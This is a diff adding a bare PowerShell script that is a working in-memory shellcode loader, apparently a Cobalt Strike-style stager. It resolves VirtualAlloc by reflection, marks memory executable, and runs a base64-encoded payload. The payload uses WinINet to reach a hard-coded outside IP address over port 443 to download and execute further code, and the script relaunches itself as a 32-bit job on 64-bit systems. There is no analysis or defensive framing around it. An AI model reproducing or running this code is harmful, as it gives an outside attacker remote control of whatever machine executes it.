@@ -1,0 +1,39 @@
+Set-StrictMode -Version 2
+
+$DoIt = @'
+function func_get_proc_address {
+	Param ($var_module, $var_procedure)		
+	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+	$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
+	return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
+}
+
+function func_get_delegate_type {
+	Param (
+		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
+		[Parameter(Position = 1)] [Type] $var_return_type = [Void]
+	)
+
+	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+	$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
+	$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')
+
+	return $var_type_builder.CreateType()
+}
+
+[Byte[]]$var_code = [System.Convert]::FromBase64String('/OiJAAAAYInlMdJki1Iwi1IMi1IUi3IoD7dKJjH/McCsPGF8Aiwgwc8NAcfi8FJXi1IQi0I8AdCLQHiFwHRKAdBQi0gYi1ggAdPjPEmLNIsB1jH/McCswc8NAcc44HX0A334O30kdeJYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS64ZdaG5ldABod2luaVRoTHcmB//V6AAAAAAx/1dXV1dXaDpWeaf/1emkAAAAWzHJUVFqA1FRaLsBAABTUGhXiZ/G/9VQ6YwAAABbMdJSaAAyoIRSUlJTUlBo61UuO//VicaDw1BogDMAAIngagRQah9WaHVGnob/1V8x/1dXav9TVmgtBhh7/9WFwA+EygEAADH/hfZ0BIn56wloqsXiXf/VicFoRSFeMf/VMf9XagdRVlBot1fgC//VvwAvAAA5x3UHWFDpe////zH/6ZEBAADpyQEAAOhv////LzlYeVIA3hlSdB1pP6GKxn2AcYNcD+mOlUz3Su0sYd5c85LWMMO5EORFa+jMFPQpugeadffMRnLXPOBBBU++Ku0DVDOrq/4Qv9HaoSJuXgBVc2VyLUFnZW50OiBNb3ppbGxhLzQuMCAoY29tcGF0aWJsZTsgTVNJRSA3LjA7IFdpbmRvd3MgTlQgNS4xOyAuTkVUNC4wQzsgLk5FVDQuMEU7IC5ORVQgQ0xSIDIuMC41MDcyNykNCgC6CP7KRpTMTWOKcYrUJ6rL1FPBEilmsxhI69M7nO3HQjN+VIEM7hMtJj2EkOHmi9RGF+VwEa2qOuZz4X5fZYOq1VdQ23A2TIMHE2XMmKSdKL2PGM7LeW+hrRkGEP2eX95N3i1hDsbAW6n2c9sKpU0BqxW3c89Gm1JqgXeHO+F51WVPnq7kZnxPh/y957Tv3FnE6C2zO0eNoB7kgUG8fbREyw5qy25NLKVib6mFffDD4TnbtTSBsb+r5n+e0qSc5jG9CvQs44AAaPC1olb/1WpAaAAQAABoAABAAFdoWKRT5f/Vk7kAAAAAAdlRU4nnV2gAIAAAU1ZoEpaJ4v/VhcB0xosHAcOFwHXlWMPoif3//zM0LjI0Ni4xNjEuMTU0AE0mZYo=')
+
+$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
+$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)
+[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)
+
+$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))
+$var_runme.Invoke([IntPtr]::Zero)
+'@
+
+If ([IntPtr]::size -eq 8) {
+	start-job { param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job
+}
+else {
+	IEX $DoIt
+}
